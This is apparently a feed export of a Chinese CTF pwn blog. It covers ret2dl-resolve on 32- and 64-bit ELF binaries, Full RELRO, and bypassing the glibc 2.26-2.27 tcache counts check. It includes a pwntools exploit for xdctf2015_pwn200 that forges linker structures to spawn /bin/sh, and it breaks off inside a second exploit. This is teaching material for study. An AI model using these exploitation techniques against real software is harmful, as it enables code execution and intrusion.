operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p><h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></code></pre><pre class=" language-c"><code class="language-c">    lookup_t result<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></code></pre><p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p><ul><li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li><li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li><li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li><li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li><li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li></ul><h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(1)：原理及基础利用</title>
      <link href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/"/>
      <url>/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p><ol><li>通过信息泄露获得程序的内存布局</li><li>实际的漏洞利用</li></ol><p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li><li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li><li>Full RELRO: 详见(2)部分内容</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 启动程序</span><span class="token comment" spellcheck="true"># io = remote('node4.buuoj.cn',26320)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = gdb.debug('./bof')</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc = ELF('./')</span><span class="token comment" spellcheck="true"># 源程序gadget</span>write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span><span class="token comment" spellcheck="true"># 程序中section地址</span>plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrrel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment" spellcheck="true"># 伪造相应结构</span>stack_size <span class="token operator">=</span> <span class="token number">0x800</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_sizefake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>fake_dynsym_addr <span class="token operator">+=</span> alignfake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstrst_value <span class="token operator">=</span> <span class="token number">0</span>st_size <span class="token operator">=</span> <span class="token number">0</span>st_info <span class="token operator">=</span> <span class="token number">0x12</span><span class="token comment" spellcheck="true">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_pltr_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>r_type <span class="token operator">=</span> <span class="token number">0x7</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_dynstr <span class="token operator">=</span> b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true"># stack pivot</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token number">-4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ret2dl_resolve</span>binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> b<span class="token string">'/bin/sh\x00'</span>payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token string">'a'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>          <span class="token comment" spellcheck="true">/* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>          return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>        <span class="token punctuation">}</span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span></code></pre><p>于是我们便在源码中寻找各变量的定义<br>tcache_perthread_struct结构体中定义了char 类型的counts数组</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct<span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre><p>glibc中并没有给出mp_.tcache_count的类型定义，不过我们可通过这一赋值操作推出mp_.tcache_count是size_t类型，而size_t在大部分机器上是无符号整型</p><pre class=" language-c"><code class="language-c"><span class="token function">do_set_tcache_count</span> <span class="token punctuation">(</span>size_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tunable_tcache_count<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">;</span>  mp_<span class="token punctuation">.</span>tcache_count <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>于是counts是char类型，mp_.tcache_count是size_t类型，在比较时会发生整型提升，故若能使counts为一个负数，便可绕过这一判断<br>那有没有办法使counts变为一个负数呢？答案是有，可以通过整数溢出做到<br>在tcache_get中存在对counts域的–操作，于是只要从Tcache中分配出的chunk数量大于释放进Tcache的数量，便可使counts变为一个负数</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对于上述操作，可以通过Tcache Poisoning技术做到(即伪造一个Tcache中的chunk,且由于Tcache分配时无对size域的检查,使这一操作能够轻松完成)<br>到此我们便完成了Tcache机制的绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这一绕过方法得益于glibc2.26-2.27中tcache_get函数的错误assert操作</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第二个断言的内容是错误的，本意应该是检查counts的符号</span>  <span class="token comment" spellcheck="true">//即assert(tcache->counts[tc_idx]>0);</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这一漏洞已在glibc2.28后的版本中修复</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>看起来感觉挺鸡肋，但是大多数题目会限制分配堆块的大小和数量，此时前两个绕过方法便已失效,这一方法便有了用武之地</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>还是以Unsortedbin Attack的经典题hitcontraining_lab14为例</p><h4 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ol><li>题目中edit_heap函数没有对size的限制存在堆溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap2.png"></li><li>若bss段变量magic&gt;4869即可执行后门函数<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap1.png"><br>所以就是Unsortedbin Attack修改magic的值</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magicheap'</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token 